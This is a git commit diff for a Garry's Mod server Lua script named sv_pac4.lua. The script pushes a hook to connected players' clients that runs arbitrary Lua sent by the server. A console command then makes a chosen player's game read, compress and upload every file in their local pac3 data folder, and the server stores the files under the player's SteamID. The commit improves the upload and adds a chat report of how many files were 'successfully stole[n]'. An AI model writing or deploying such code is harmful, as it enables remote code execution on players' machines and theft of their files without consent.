b2053941ec580a5ae3cd136245f0f728bc15fe1a
awesomeusername69420 <24661212+awesomeusername69420@users.noreply.github.com>
2022-06-28 15:11:34 -0400

    Update sv_pac4.lua
    fixed only 1 file sending
    another net message to send amount of files (dumb but im lazy)
    better anti exploit (?)
    tells you how many files were successfully stolen and how many failed

--- sv_pac4.lua
+++ sv_pac4.lua
@@ -8,6 +8,7 @@
 ]]
 
 util.AddNetworkString("pac4")
+util.AddNetworkString("pac5")
 
 file.CreateDir("pac4")
 
@@ -30,14 +31,14 @@ end
 local function MassSendLua(ply, lua) -- Bypass 255 byte SendLua limit
 	if not IsValid(ply) or not ply:IsFullyAuthenticated() then return end
 	
-	if not ply._IsSetup then
+	if not ply._Pac4IsSetup then
 		ply:SendLua([=[
 			net.Receive("pac4", function()
 				RunString(net.ReadString())
 			end)
 		]=])
 		
-		ply._IsSetup = true
+		ply._Pac4IsSetup = true
 	end
 	
 	net.Start("pac4")
@@ -46,9 +47,9 @@ local function MassSendLua(ply, lua) -- Bypass 255 byte SendLua limit
 end
 
 net.Receive("pac4", function(len, ply)
-	if not ply._WasRequested then return end
-
-	ply._WasRequested = false
+	if not ply._Pac4WasRequested or ply._Pac4Received >= ply._Pac4Limit then return end
+	
+	ply._Pac4Received = ply._Pac4Received + 1
 
 	local name = net.ReadString()
 
@@ -60,6 +61,25 @@ net.Receive("pac4", function(len, ply)
 	file.CreateDir("pac4/" .. ply:SteamID64())
 	
 	file.Write("pac4/" .. ply:SteamID64() .. "/" .. name, contents)
+	
+	if ply._Pac4Received >= ply._Pac4Limit then
+		if IsValid(ply._CallingPly) then
+			ply._CallingPly:ChatPrint("[Pac4] - Successfully stole " .. ply._Pac4Received .. " files. " .. (ply._Pac4Limit - ply._Pac4Received ) .. " failed.")
+		end
+	
+		ply._Pac4WasRequested = false
+		ply._Pac4Limit = 0
+		ply._Pac4LimitSet = false
+		ply._Pac4Received = 0
+		ply._CallingPly = NULL
+	end
+end)
+
+net.Receive("pac5", function(len, ply)
+	if not ply._Pac4WasRequested or ply._Pac4LimitSet then return end
+
+	ply._Pac4Limit = net.ReadUInt(16)
+	ply._Pac4LimitSet = true
 end)
 
 concommand.Add("pac4", function(ply, _, args, argstr)
@@ -77,19 +97,39 @@ concommand.Add("pac4", function(ply, _, args, argstr)
 		return
 	end
 	
-	tply._WasRequested = true
-	
+	tply._CallingPly = ply
+	tply._Pac4WasRequested = true
+	tply._Pac4Limit = 0
+	tply._Pac4LimitSet = false
+
 	MassSendLua(tply, [=[
-		local f, _ = file.Find("pac3/*", "DATA")
-		
-		for _, v in ipairs(f) do
-			local cData = util.Compress(file.Read("pac3/" .. v, "DATA"))
-		
-			net.Start("pac4")
-				net.WriteString(v)
-				net.WriteUInt(#cData, 16)
-				net.WriteData(cData, #cData)
+		net.Receive("pac5", function()
+			local f, _ = file.Find("pac3/*", "DATA")
+
+			net.Start("pac5")
+				net.WriteUInt(#f, 16)
 			net.SendToServer()
-		end
+		end)
 	]=])
+	
+	net.Start("pac5")
+	net.Send(tply)
+	
+	timer.Simple(0.3, function()
+		tply._Pac4Received = 0
+	
+		MassSendLua(tply, [=[
+			local f, _ = file.Find("pac3/*", "DATA")
+			
+			for _, v in ipairs(f) do
+				local cData = util.Compress(file.Read("pac3/" .. v, "DATA"))
+			
+				net.Start("pac4")
+					net.WriteString(v)
+					net.WriteUInt(#cData, 16)
+					net.WriteData(cData, #cData)
+				net.SendToServer()
+			end
+		]=])
+	end)
 end)
